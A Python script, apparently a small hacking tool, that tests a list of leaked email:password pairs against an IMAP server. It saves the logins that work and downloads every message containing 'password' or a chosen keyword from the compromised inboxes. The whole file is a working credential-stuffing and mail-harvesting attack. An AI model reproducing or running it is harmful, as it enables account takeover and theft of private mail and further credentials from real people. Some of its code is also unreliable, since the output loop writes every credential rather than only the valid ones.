import click
import imapclient
import pyzmail
import pprint
import os



@click.option('--file' , prompt=True, help='Input fileName. Format : "mail:password"')
@click.option('--server', prompt=True, help='IMAP server address')
@click.option('--out', default='out.txt', help='OPTIONAL default:out.txt Output fileName')
@click.option('--searchpasswords', default='False', help='OPTIONAL If True checks for password in this mailbox and retrieves mails')
@click.option('--search', default='', help='OPTIONAL Search in this mailbox and retrieves mails with this word')


@click.command()
def mailcheck(file, server, out,searchpasswords,search):
    """
    A little mail tool that checks if a list of usernames:password is still valid. It outputs by default to out.txt the
    working ones.
    You can add the option --searchpasswords to check in a mailbox if the word password is present and retrieves them all.
    You can do a custom search too with --search <word>.
    Examples:

    1. mailcheck --file listpawned.txt --server mail.domain.com --out validmails.txt

    2. mailcheck --file validmails.txtt --server mail.domain.com --search invoice

    3. mailcheck --file validmails.txtt --server mail.domain.com --searchpasswords
    """
    credentials = {}
    users = []
    good = {}
    with open(file, 'r') as f:
        for line in f:
            user, pwd = line.strip().split(':')
            credentials[user] = pwd
            users.append(user)

    for user in users:
        try:
            click.echo("")
            click.echo(user + " : " + credentials[user])
            imapObj = imapclient.IMAPClient(server, ssl=True)
            imapObj.login(user, credentials[user])
            imapObj.select_folder('INBOX', readonly=True)
            click.echo("GOOD !!!" + user + " : " + credentials[user])
            good[user] = credentials[user]

            if search != '':
                UIDs = imapObj.search([u'TEXT', search])
                folder = search
                if UIDs:
                    downmails(user,imapObj,UIDs,folder)

            if searchpasswords == 'True':
                UIDs = imapObj.search([u'TEXT', 'password'] )
                folder = 'passwords'

                if UIDs:
                    downmails(user,imapObj,UIDs,folder)

            imapObj.logout()

        except imapclient.exceptions.LoginError:
            pass

    click.echo(' ')
    click.echo('Good Users Passwords : ')

    for user in users:
        print(user+" : "+credentials[user])

        with open(out, 'a') as the_file:
            the_file.write(user+" : "+credentials[user]+"\n")


def downmails(user,imapObj,UIDs,folder):
    newpath = r'.\\'+user
    if not os.path.exists(newpath):
        os.makedirs(newpath)

    newpathuser = r'.\\'+user + r'\\' + folder
    if not os.path.exists(newpathuser):
        os.makedirs(newpathuser)

    click.echo('Passwords present')
    click.echo(UIDs)
    l = len(UIDs)
    rawmsg = imapObj.fetch(UIDs, ['BODY[]'])

    for i in range(l):
        msg = pyzmail.PyzMessage.factory(rawmsg[UIDs[i]]['BODY[]'])
        subject = msg.get_subject()
        fromaddr = msg.get_address('from')
        #body = str(msg.get_payload())
        if msg.text_part != None:
            body = msg.text_part.get_payload().decode(msg.text_part.charset)
        if msg.html_part != None:
            body = msg.html_part.get_payload().decode(msg.html_part.charset)

        with open(newpathuser+'\\'+str(i+1)+'.html','a') as the_file1:
            the_file1.write(body.encode("utf8"))
        with open(newpathuser+'\\'+str(i + 1)+'.txt','a') as the_file2:
            the_file2.write('\nMessage ' + str(i + 1) + ': '+"\n")
            the_file2.write('Subject: ' + subject.encode("utf8")+"\n")
            the_file2.write('From: ' + fromaddr[0].encode("utf8") + ' <' + fromaddr[1] + '>'+"\n")
            the_file2.write('Body:\n' + body.encode("utf8")+"\n")

if __name__ == '__main__':
    mailcheck()
